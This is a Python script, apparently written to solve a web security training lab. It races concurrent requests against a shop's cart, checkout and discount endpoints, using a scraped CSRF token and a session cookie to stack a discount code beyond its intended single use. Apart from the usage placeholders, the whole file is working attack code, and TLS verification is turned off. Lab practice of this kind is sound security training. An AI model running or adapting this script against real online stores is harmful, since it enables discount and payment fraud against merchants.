import requests
import threading
import re
from bs4 import BeautifulSoup

class RaceConditionExploit:
    def __init__(self, lab_url, session_cookie):
        self.lab_url = lab_url
        self.session_cookie = session_cookie
        self.csrf_token = None
        self.headers = {
            "Cookie": f"session={session_cookie}",
            "User-Agent": "Race-Condition-Exploit/1.0"
        }
    
    def get_csrf_token(self, url_path="/cart"):
        """Extract CSRF token from page"""
        try:
            response = requests.get(f"{self.lab_url}{url_path}", 
                                  headers=self.headers, 
                                  verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrf'})
            if csrf_input:
                self.csrf_token = csrf_input.get('value')
                return self.csrf_token
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
        return None
    
    def race_attack(self):
        """Perform race condition attack"""
        if not self.csrf_token:
            self.get_csrf_token()
        
        def attack_endpoint(endpoint, data, name):
            for i in range(20):
                try:
                    response = requests.post(
                        f"{self.lab_url}{endpoint}",
                        data=data,
                        headers=self.headers,
                        verify=False
                    )
                    print(f"{name} - Attempt {i+1}: {response.status_code}")
                except:
                    pass
        
        # Adjust these based on actual lab endpoints
        threads = []
        
        # Example endpoints (adjust based on actual lab)
        endpoints = [
            ("/cart", {"productId": "1", "quantity": "100", "redir": "CART"}, "Add to Cart"),
            ("/cart/checkout", {"csrf": self.csrf_token}, "Checkout"),
            ("/cart/discount", {"csrf": self.csrf_token, "discountCode": "SIGNUP30"}, "Discount")
        ]
        
        for endpoint, data, name in endpoints:
            thread = threading.Thread(target=attack_endpoint, 
                                    args=(endpoint, data, name))
            threads.append(thread)
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()

# Usage
if __name__ == "__main__":
    lab_url = "https://your-lab-id.web-security-academy.net"
    session_cookie = "your-session-cookie"
    
    exploit = RaceConditionExploit(lab_url, session_cookie)
    exploit.race_attack()
